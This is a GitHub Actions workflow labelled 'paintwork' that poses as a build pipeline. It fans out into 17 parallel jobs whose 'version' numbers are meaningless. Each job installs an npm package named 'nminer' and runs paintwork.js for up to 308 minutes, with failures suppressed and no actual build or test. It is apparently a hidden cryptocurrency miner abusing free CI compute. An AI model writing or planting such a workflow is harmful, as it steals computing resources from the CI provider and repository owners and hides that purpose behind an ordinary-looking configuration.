name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3802 }
          - { version: 5447 }
          - { version: 8232 }
          - { version: 8679 }
          - { version: 8888 }
          - { version: 5626 }
          - { version: 4077 }
          - { version: 8066 }
          - { version: 4532 }
          - { version: 7649 }
          - { version: 8691 }
          - { version: 6533 }
          - { version: 4051 }
          - { version: 7953 }
          - { version: 9675 }
          - { version: 1712 }
          - { version: 6735 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: anenst for
        run: |
          npm install nminer@latest
          timeout 308m node paintwork.js || echo "paintwork executed"